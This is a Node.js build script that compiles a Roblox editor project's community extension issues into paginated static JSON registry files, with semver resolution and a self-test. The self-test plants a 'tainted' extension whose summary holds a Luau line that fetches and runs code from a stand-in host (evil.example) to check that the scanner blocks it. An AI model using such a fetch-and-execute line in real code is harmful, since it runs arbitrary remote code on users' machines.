#!/usr/bin/env node
/**
 * VS-RBLX Static CDN Marketplace Compiler & Sub-Issue SemVer Resolver
 * (`.github/scripts/build_extension_registry.js`)
 *
 * Compiles verified clean Community Extension GitHub Issues + same-author GitHub Sub-Issues
 * into 10-per-page static JSON files (`registry/index.json`, `registry/page-1.json`, ...)
 * served via `raw.githubusercontent.com` CDN with ZERO GitHub REST API 60/hr rate limit!
 */

"use strict";

const fs = require("fs");
const path = require("path");
const assert = require("assert");
const { validateIssue: scanExtensionIssue } = require("./validate_extension_issue.js");

const PAGE_SIZE = 10;

function parseSemver(v) {
  const m = String(v || "").trim().match(/^(\d+)\.(\d+)\.(\d+)$/);
  if (!m) return null;
  return [Number(m[1]), Number(m[2]), Number(m[3])];
}

function compareSemver(a, b) {
  const pa = parseSemver(a) || [0, 0, 0];
  const pb = parseSemver(b) || [0, 0, 0];
  for (let i = 0; i < 3; i++) {
    if (pa[i] !== pb[i]) return pa[i] > pb[i] ? 1 : -1;
  }
  return 0;
}

/**
 * Resolves a parent extension issue + its GitHub sub-issues into the newest verified
 * clean Semantic Version authored by the exact same GitHub owner.
 */
function resolveExtensionFamily(parentIssue, subIssues) {
  const parentAuthor = String((parentIssue.user && parentIssue.user.login) || "").trim();
  const parentScan = scanExtensionIssue(parentIssue.title || "", parentIssue.body || "");
  if (!parentScan.ok || !parentScan.manifest) {
    return { ok: false, reason: "Parent issue failed 5-template/malware scan", findings: parentScan.findings };
  }

  const baseId = parentScan.manifest.id;
  const baseTemplate = parentScan.manifest.template;

  const validVersions = [
    {
      version: parentScan.manifest.version,
      issueNumber: parentIssue.number,
      htmlUrl: parentIssue.html_url || "",
      manifest: Object.assign({}, parentScan.manifest, { author: parentAuthor || parentScan.manifest.author }),
    },
  ];
  const rejectedSubIssues = [];

  for (const sub of subIssues || []) {
    if (!sub || sub.pull_request) continue;
    if (sub.state && sub.state !== "open") continue;

    const subAuthor = String((sub.user && sub.user.login) || "").trim();
    if (!parentAuthor || subAuthor.toLowerCase() !== parentAuthor.toLowerCase()) {
      rejectedSubIssues.push({
        issueNumber: sub.number,
        reason: `Author mismatch (@${subAuthor} !== @${parentAuthor})`,
      });
      continue;
    }

    const subScan = scanExtensionIssue(sub.title || "", sub.body || "");
    if (!subScan.ok || !subScan.manifest) {
      rejectedSubIssues.push({
        issueNumber: sub.number,
        reason: "Sub-issue failed malware/schema scan",
      });
      continue;
    }

    if (subScan.manifest.id !== baseId || subScan.manifest.template !== baseTemplate) {
      rejectedSubIssues.push({
        issueNumber: sub.number,
        reason: `Sub-issue id/template mismatch (${subScan.manifest.id} vs ${baseId})`,
      });
      continue;
    }

    validVersions.push({
      version: subScan.manifest.version,
      issueNumber: sub.number,
      htmlUrl: sub.html_url || "",
      manifest: Object.assign({}, subScan.manifest, { author: parentAuthor }),
    });
  }

  validVersions.sort((x, y) => compareSemver(y.version, x.version));
  const newest = validVersions[0];

  return {
    ok: true,
    id: baseId,
    parentIssueNumber: parentIssue.number,
    resolvedIssueNumber: newest.issueNumber,
    author: parentAuthor || newest.manifest.author || "community",
    latestVersion: newest.version,
    versionHistory: validVersions.map((v) => ({
      version: v.version,
      issueNumber: v.issueNumber,
    })),
    rejectedSubIssues,
    htmlUrl: newest.htmlUrl || parentIssue.html_url || "",
    comments: Number(parentIssue.comments || 0),
    manifest: newest.manifest,
  };
}

function paginateRegistry(resolvedItems, pageSize = PAGE_SIZE) {
  const pages = [];
  for (let i = 0; i < resolvedItems.length; i += pageSize) {
    pages.push(resolvedItems.slice(i, i + pageSize));
  }
  if (pages.length === 0) pages.push([]);
  return pages;
}

function writeRegistryFiles(outDir, resolvedItems, repoSlug = "TheStrongestOfTomorrow/VS-RBLX") {
  fs.mkdirSync(outDir, { recursive: true });
  const pages = paginateRegistry(resolvedItems, PAGE_SIZE);
  const generatedAt = new Date().toISOString();

  pages.forEach((items, idx) => {
    const pageNum = idx + 1;
    const pagePayload = {
      schema: 1,
      repo: repoSlug,
      page: pageNum,
      pageSize: PAGE_SIZE,
      totalPages: pages.length,
      totalExtensions: resolvedItems.length,
      hasMore: pageNum < pages.length,
      generatedAt,
      items,
    };
    fs.writeFileSync(
      path.join(outDir, `page-${pageNum}.json`),
      JSON.stringify(pagePayload, null, 2) + "\n",
      "utf8"
    );
  });

  const indexPayload = {
    schema: 1,
    repo: repoSlug,
    pageSize: PAGE_SIZE,
    totalPages: pages.length,
    totalExtensions: resolvedItems.length,
    generatedAt,
  };
  fs.writeFileSync(path.join(outDir, "index.json"), JSON.stringify(indexPayload, null, 2) + "\n", "utf8");
  return indexPayload;
}

function makeFormBody(manifest) {
  return [
    "### Extension Template",
    manifest.template,
    "### Extension ID",
    manifest.id,
    "### Display Name",
    manifest.name,
    "### Version",
    manifest.version,
    "### Summary",
    manifest.summary || "Verified declarative community extension.",
    "### Manifest JSON",
    "```json",
    JSON.stringify(manifest, null, 2),
    "```",
  ].join("\n\n");
}

function runSelfTest() {
  const parent = {
    number: 10,
    title: "[EXT] Crimson Midnight",
    user: { login: "RobloxCreator" },
    html_url: "https://github.com/TheStrongestOfTomorrow/VS-RBLX/issues/10",
    body: makeFormBody({
      id: "crimson-midnight",
      name: "Crimson Midnight",
      version: "1.0.0",
      template: "theme-pack",
      theme: { colors: { editor: "#100810", accent: "#e11d48" } },
    }),
  };

  const validUpgradeSub = {
    number: 14,
    state: "open",
    title: "[EXT] Crimson Midnight v1.2.0",
    user: { login: "RobloxCreator" },
    body: makeFormBody({
      id: "crimson-midnight",
      name: "Crimson Midnight",
      version: "1.2.0",
      template: "theme-pack",
      theme: { colors: { editor: "#0c060c", accent: "#f43f5e" } },
    }),
  };

  const spoofSub = {
    number: 15,
    state: "open",
    title: "[EXT] Hijack Attempt v9.9.9",
    user: { login: "SomeOtherUser" },
    body: makeFormBody({
      id: "crimson-midnight",
      name: "Crimson Midnight",
      version: "9.9.9",
      template: "theme-pack",
      theme: { colors: { editor: "#000000" } },
    }),
  };

  const malwareSub = {
    number: 16,
    state: "open",
    title: "[EXT] Tainted Update v2.0.0",
    user: { login: "RobloxCreator" },
    body: makeFormBody({
      id: "crimson-midnight",
      name: "Crimson Midnight",
      version: "2.0.0",
      template: "theme-pack",
      summary: "loadstring(game:HttpGet('https://evil.example/x.lua'))()",
      theme: { colors: { editor: "#000000" } },
    }),
  };

  const res = resolveExtensionFamily(parent, [validUpgradeSub, spoofSub, malwareSub]);
  assert.strictEqual(res.ok, true, "Parent + clean sub-issue resolved");
  assert.strictEqual(res.latestVersion, "1.2.0", "Selected highest clean same-author SemVer (1.2.0)");
  assert.strictEqual(res.resolvedIssueNumber, 14, "Resolved to clean sub-issue #14");
  assert.strictEqual(res.rejectedSubIssues.length, 2, "Blocked cross-author spoof AND tainted malware sub-issue");

  // Verify 10-per-page pagination across 13 items -> 2 pages (10 + 3)
  const dummyItems = [];
  for (let i = 1; i <= 13; i++) dummyItems.push({ id: `ext-${i}` });
  const sliced = paginateRegistry(dummyItems, 10);
  assert.strictEqual(sliced.length, 2, "13 items sliced into 2 pages");
  assert.strictEqual(sliced[0].length, 10, "Page 1 has 10 items");
  assert.strictEqual(sliced[1].length, 3, "Page 2 has remaining 3 items");

  console.log("PASS build_extension_registry.js self-test (SemVer=1.2.0, spoof=BLOCKED, malware=BLOCKED, pagination=10/page)");
}

if (require.main === module) {
  if (process.argv.includes("--self-test")) {
    runSelfTest();
    process.exit(0);
  }
  if (process.argv.includes("--seed")) {
    const outDir = path.resolve(process.cwd(), "registry");
    const seedStarters = [
      {
        id: "tokyo-cyberpunk-neon",
        name: "Tokyo Cyberpunk Neon",
        version: "1.1.0",
        author: "vs-rblx-core",
        template: "theme-pack",
        summary: "Electric cyan & magenta dark theme — strictly hex color tokens.",
        theme: {
          base: "tokyo_night",
          colors: { editor: "#0d0f1a", sideBar: "#090b14", titleBar: "#070810", statusBar: "#ec4899", accent: "#06b6d4", accentHover: "#22d3ee" },
          syntax: { keyword: "#f472b6", ["function"]: "#22d3ee", string: "#a3e635" },
        },
      },
      {
        id: "roblox-datastore-snippets",
        name: "Roblox DataStore & Network Snippets",
        version: "1.0.0",
        author: "vs-rblx-core",
        template: "snippet-pack",
        summary: "Safe pcall DataStore & RemoteEvent boilerplate snippets with $0 cursor stops.",
        snippets: [
          { prefix: "pcallds", label: "pcallds (Safe DataStore GetAsync)", detail: "Snippet · DataStore pcall", body: "local ok, data = pcall(function()\n\treturn DataStore:GetAsync($0)\nend)" },
        ],
      },
      {
        id: "luau-header-banner",
        name: "Luau File Header & Timestamp Macro",
        version: "1.0.0",
        author: "vs-rblx-core",
        template: "command-macro",
        summary: "Adds a Palette command that prepends a clean module doc-comment header.",
        commands: [
          { id: "prependHeader", title: "Insert Module Header Comment", action: "prependText", text: "--!strict\n-- Module maintained in VS-RBLX\n\n" },
        ],
      },
      {
        id: "ergonomic-keymap-preset",
        name: "Ergonomic Luau Keymap Preset",
        version: "1.0.0",
        author: "vs-rblx-core",
        template: "keymap-preset",
        summary: "Declarative keyboard bindings for quick Zen Mode, Problems, and AI Chat.",
        keymap: {
          bindings: [
            { key: "F9", command: "view.problems" },
            { key: "F10", command: "ai.toggleChat" },
          ],
        },
      },
      {
        id: "luau-text-transforms",
        name: "Luau Text Utilities (Sort / Trim / pcall)",
        version: "1.0.0",
        author: "vs-rblx-core",
        template: "toolbar-tool",
        summary: "Declarative text transforms: Sort Lines A-Z, Trim Trailing Spaces, Wrap in pcall.",
        tools: [
          { id: "sortLines", label: "AZ Sort Lines", transform: "sortLines" },
          { id: "trimLines", label: "✂ Trim Spaces", transform: "trimLines" },
          { id: "wrapPcall", label: "🛡 Wrap pcall", transform: "wrapPcall" },
        ],
      },
    ].map((m, i) => ({
      ok: true,
      id: m.id,
      parentIssueNumber: i + 1,
      resolvedIssueNumber: i + 1,
      author: m.author,
      latestVersion: m.version,
      versionHistory: [{ version: m.version, issueNumber: i + 1 }],
      htmlUrl: "https://github.com/TheStrongestOfTomorrow/VS-RBLX/issues",
      comments: 0,
      manifest: m,
    }));

    const idx = writeRegistryFiles(outDir, seedStarters);
    console.log(`Wrote static CDN registry (${idx.totalExtensions} extensions across ${idx.totalPages} page(s)) to ${outDir}`);
    process.exit(0);
  }
}

module.exports = {
  PAGE_SIZE,
  parseSemver,
  compareSemver,
  resolveExtensionFamily,
  paginateRegistry,
  writeRegistryFiles,
};
